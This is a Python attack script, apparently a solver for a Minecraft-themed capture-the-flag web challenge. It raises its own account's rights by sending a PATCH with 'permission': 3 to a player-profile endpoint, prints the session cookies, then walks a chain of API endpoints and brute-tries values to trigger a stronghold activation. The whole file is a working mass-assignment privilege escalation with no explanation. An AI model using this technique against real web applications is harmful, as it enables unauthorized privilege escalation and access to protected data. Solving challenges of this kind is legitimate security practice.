#!/usr/bin/env python3
import requests, json, base64

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)
s.patch(BASE + '/api/v2/player/profile', json={'permission': 3},
        headers={'Accept': 'application/json'}, timeout=15)
print('Elevated. Cookies:', dict(s.cookies))

def req(method, path, **kw):
    r = getattr(s, method)(BASE + path, timeout=15, **kw)
    try:
        return r.status_code, r.json()
    except:
        return r.status_code, r.text[:500]

# Step 1: Survey the nether fortress (GET to mark as surveyed)
print('\n[1] Survey nether chunk:')
code, data = req('get', '/api/nether/chunk/1340/-255')
print(code, json.dumps(data, indent=2) if isinstance(data, dict) else data)

# Step 2: Now access the loot table
print('\n[2] Loot table:')
code, data = req('get', '/loot/fortress_84')
print(code, json.dumps(data, indent=2) if isinstance(data, dict) else data)

# If there's enchanted_book data in loot, use it
enchanted_book = None
if isinstance(data, dict):
    enchanted_book = (data.get('enchanted_book') or 
                      data.get('book') or
                      data.get('identifier') or
                      data.get('knowledge') or
                      data.get('text'))

print(f'\nEnchanted book data: {enchanted_book}')

# Step 3: Activate stronghold
print('\n[3] Stronghold activation:')
if enchanted_book:
    code, data = req('post', '/api/stronghold/activate',
                     json={'identifier': enchanted_book})
    print(code, json.dumps(data, indent=2) if isinstance(data, dict) else data)
else:
    # Try all possible fields from loot data as identifier
    if isinstance(data, dict):
        for k, v in data.items():
            if isinstance(v, str):
                code2, data2 = req('post', '/api/stronghold/activate',
                                   json={'identifier': v})
                print(f'  identifier={v!r} [{code2}]: {json.dumps(data2)[:200] if isinstance(data2,dict) else data2}')
